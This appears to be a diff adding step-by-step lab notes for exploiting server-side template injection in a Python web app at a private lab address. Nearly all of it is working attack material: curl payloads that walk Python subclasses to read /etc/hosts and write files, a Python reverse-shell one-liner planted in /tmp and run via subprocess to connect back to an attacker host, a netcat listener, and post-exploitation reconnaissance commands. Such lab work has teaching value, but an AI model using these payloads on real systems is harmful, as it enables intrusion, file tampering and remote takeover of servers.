@@ -1,0 +1,110 @@
+~~~ Discovering the SSTI Vulnerability ~~~
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name=bryce"
+
+/?name={{code here}} # point of vulnerability
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6 * 3}}"
+# testing SSTI
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__}}"
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__}}"
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1]}}"
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()}}"
+
+
+~~~ Chrome Developer Tools ~~~
+
+http://10.0.2.36:5000/
+
+{{6.__class__.__mro__[1].__subclasses__()}}
+
+
+~~~ Using the Console to Parse out the Response ~~~
+
+document.getElementsByClassName("congratulations")[0]
+# get element containing data returned from SSTI
+
+document.getElementsByClassName("congratulations")[0].innerText
+# get data returned from SSTI
+
+(?<=(Type|Class) ')([^ ]*)(?=') # regex to parse SSTI data results
+
+/(?<=(Type|Class) ')([^ ]*)(?=')/g # regex in Javascript
+
+let names = document.getElementsByClassName("congratulations")[0].innerText.match(/(?<=(Type|Class) ')([^ ]*)(?=')/g)
+# get data from element and parse with regex
+
+names
+# print names parse through previous javascript command
+
+names = names.map(name => name.toLowerCase())
+
+
+~~~ Discovering Important Elements ~~~
+
+names.filter(name => name.includes("subprocess"))
+
+names.filter(name => name.includes("file")) 
+
+names.filter(name => name.includes("request")) 
+
+names.filter(name => name.includes("config")) 
+
+
+~~~ File Read ~~~
+
+names.indexOf("file")
+# import number of file
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[40]('/etc/hosts').read()}}"
+
+
+~~~ File Write ~~~
+
+{{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt','w').write('file write totes works')}}
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt','w').write('file write totes works')}}"
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/test.txt').read()}}"
+
+
+~~~ RCE ~~~
+
+names.indexOf("subprocess.popen")
+
+ifconfig eth0
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.1.251",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+# Python code we want to run on target
+
+{{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/reverseShell.py','w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.1.189",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')}}
+# code put into the attack
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/reverseShell.py','w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.1.251\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);')}}"
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[40]('/tmp/reverseShell.py').read()}}"
+
+nc -lvp 80
+# setup local listener
+
+curl -G "http://10.0.2.36:5000/" --data-urlencode "name={{6.__class__.__mro__[1].__subclasses__()[230](['/usr/bin/python', '/tmp/reverseShell.py'])}}"
+
+
+~~~ Post Exploitation ~~~
+
+id
+
+uname -a
+
+w
+
+cat /etc/*release*
+
+cat /etc/hostname
+
+ls -alF /
+
